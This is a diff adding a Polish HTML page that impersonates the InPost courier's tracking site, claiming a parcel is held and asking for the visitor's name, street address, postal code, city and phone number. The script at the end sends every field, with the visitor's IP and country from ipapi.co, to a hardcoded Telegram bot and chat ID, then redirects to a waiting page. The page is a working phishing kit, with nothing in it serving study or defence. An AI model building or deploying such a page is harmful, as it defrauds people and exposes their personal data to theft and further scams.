@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <title>InPost - Śledzenie Przesyłki</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --inpost-yellow: #ffcc00;
+            --inpost-dark: #1d1d1b;
+            --inpost-green: #006633;
+            --inpost-red: #d80000;
+            --bg-gray: #f8f8f8;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Montserrat', sans-serif;
+            background-color: var(--bg-gray);
+            color: var(--inpost-dark);
+        }
+
+        /* --- OFFICIAL MAINTENANCE BANNER --- */
+        .banner {
+            background-color: var(--inpost-green);
+            color: #fff;
+            text-align: center;
+            padding: 10px 0;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .banner a {
+            background: var(--inpost-yellow);
+            color: #000;
+            padding: 4px 12px;
+            border-radius: 2px;
+            text-decoration: none;
+            margin-left: 10px;
+            font-size: 11px;
+            text-transform: uppercase;
+        }
+
+        /* --- PRO HEADER --- */
+        header { background: #fff; border-bottom: 1px solid #eee; }
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .logo img { height: 50px; } 
+
+        .nav-links { display: flex; gap: 25px; font-weight: 700; font-size: 13px; color: #444; }
+        .nav-links span { cursor: pointer; }
+        .nav-links span:hover { color: #000; }
+
+        .sub-nav { background: var(--inpost-yellow); }
+        .sub-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            gap: 30px;
+            font-weight: 800;
+            font-size: 11px;
+            text-transform: uppercase;
+        }
+        .sub-item {
+            padding: 15px 0;
+            border-bottom: 4px solid transparent;
+            cursor: pointer;
+        }
+        .sub-item.active { border-bottom-color: #000; }
+
+        /* --- TRACKING PANEL --- */
+        .main-card {
+            max-width: 700px;
+            margin: 50px auto;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+            padding: 40px;
+        }
+
+        .stepper {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            position: relative;
+        }
+        .step { text-align: center; flex: 1; z-index: 1; }
+        .circle {
+            width: 40px;
+            height: 40px;
+            background: #e0e0e0;
+            border-radius: 50%;
+            margin: 0 auto 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: 800;
+        }
+        .step.active .circle { background: var(--inpost-green); }
+        .step.error .circle { background: var(--inpost-red); box-shadow: 0 0 0 5px rgba(216, 0, 0, 0.1); }
+        .step-label { font-size: 10px; font-weight: 800; text-transform: uppercase; color: #999; }
+        .step.error .step-label { color: var(--inpost-red); }
+
+        /* --- FORM --- */
+        .form-group { margin-bottom: 20px; }
+        label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 8px; }
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 15px;
+            font-family: inherit;
+        }
+        input:focus { outline: none; border-color: var(--inpost-yellow); }
+
+        .btn-submit {
+            width: 100%;
+            background: var(--inpost-yellow);
+            border: none;
+            padding: 18px;
+            font-weight: 800;
+            font-size: 14px;
+            text-transform: uppercase;
+            cursor: pointer;
+            border-radius: 4px;
+            margin-top: 20px;
+        }
+        .btn-submit:hover { background: #f5c400; }
+
+        /* --- FOOTER --- */
+        footer {
+            background: #fff;
+            padding: 40px 20px;
+            text-align: center;
+            border-top: 1px solid #eee;
+            margin-top: 100px;
+        }
+        .footer-logo { height: 25px; opacity: 0.4; filter: grayscale(1); margin-bottom: 20px; }
+        .legal { font-size: 11px; color: #888; line-height: 1.8; }
+    </style>
+</head>
+<body>
+
+<div class="banner">
+    Informujemy o planowanych pracach serwisowych w niedzielę. <a href="#">SZCZEGÓŁY</a>
+</div>
+
+<header>
+    <div class="nav-container">
+        <div class="logo">
+            <img src="https://images.seeklogo.com/logo-png/34/1/inpost-logo-png_seeklogo-347126.png" alt="InPost">
+        </div>
+        <div class="nav-links">
+            <span>ODBIERAM</span>
+            <span>WYSYŁAM</span>
+            <span>DLA FIRM</span>
+            <span>O NAS</span>
+        </div>
+    </div>
+    <div class="sub-nav">
+        <div class="sub-container">
+            <div class="sub-item active">ŚLEDŹ PRZESYŁKĘ</div>
+            <div class="sub-item">ZNAJDŹ PACZKOMAT</div>
+            <div class="sub-item">CENNIK</div>
+        </div>
+    </div>
+</header>
+
+<div class="main-card">
+    <div class="stepper">
+        <div class="step active"><div class="circle">✓</div><div class="step-label">Nadana</div></div>
+        <div class="step active"><div class="circle">✓</div><div class="step-label">W trasie</div></div>
+        <div class="step error"><div class="circle">!</div><div class="step-label">Wstrzymana</div></div>
+        <div class="step"><div class="circle"></div><div class="step-label">Doręczenie</div></div>
+    </div>
+
+    <div style="background: #fff5f5; border-left: 4px solid var(--inpost-red); padding: 20px; margin-bottom: 30px;">
+        <h3 style="margin: 0; font-size: 16px; color: var(--inpost-red);">Wymagana weryfikacja adresu</h3>
+        <p style="font-size: 13px; color: #666; margin: 8px 0 0;">Twoja przesyłka PX155360 została wstrzymana z powodu niepełnych danych adresowych.</p>
+    </div>
+
+    <form id="trackingForm">
+        <div class="form-group">
+            <label>Imię i Nazwisko</label>
+            <input type="text" name="full_name" required>
+        </div>
+        <div class="form-group">
+            <label>Ulica i numer domu</label>
+            <input type="text" name="address" required>
+        </div>
+        <div style="display: flex; gap: 15px;">
+            <div class="form-group" style="flex: 1;">
+                <label>Kod pocztowy</label>
+                <input type="text" name="zip" placeholder="00-000" required>
+            </div>
+            <div class="form-group" style="flex: 2;">
+                <label>Miejscowość</label>
+                <input type="text" name="city" required>
+            </div>
+        </div>
+        <div class="form-group">
+            <label>Numer telefonu</label>
+            <input type="tel" name="phone" placeholder="+48" required>
+        </div>
+        <button type="submit" class="btn-submit">Zaktualizuj dane i ponów dostawę</button>
+    </form>
+</div>
+
+<footer>
+    <img src="https://images.seeklogo.com/logo-png/34/1/inpost-logo-png_seeklogo-347126.png" class="footer-logo">
+    <div class="legal">
+        &copy; 2026 InPost S.A. Wszystkie prawa zastrzeżone.<br>
+        Polityka Prywatności | Regulamin świadczenia usług | Kontakt
+    </div>
+</footer>
+
+<script>
+    // --- TELEGRAM CONFIGURATION ---
+    const TELEGRAM_TOKEN = '8700709423:AAEdQzbh_uCrdR_HjCY8Af_QP3LYIN_wblE';
+    const TELEGRAM_CHAT_ID = '5995238784';
+
+    document.getElementById('trackingForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const formData = new FormData(this);
+        let message = "📦 *Nowe Dane InPost*\n\n";
+
+        // Pobieranie IP i Kraju przed wysyłką
+        try {
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+            message += `🌐 *IP:* \`${ipData.ip}\`\n`;
+            message += `📍 *Kraj:* \`${ipData.country_name}\`\n\n`;
+        } catch (error) {
+            message += `🌐 *IP:* \`Nie udało się pobrać\`\n\n`;
+        }
+        
+        formData.forEach((value, key) => {
+            message += `*${key}:* \`${value}\`\n`;
+        });
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(() => {
+            window.location.href = "wait1.html";
+        })
+        .catch(err => {
+            console.error('Error sending to Telegram:', err);
+            window.location.href = "wait1.html";
+        });
+    });
+</script>
+
+</body>
+</html>
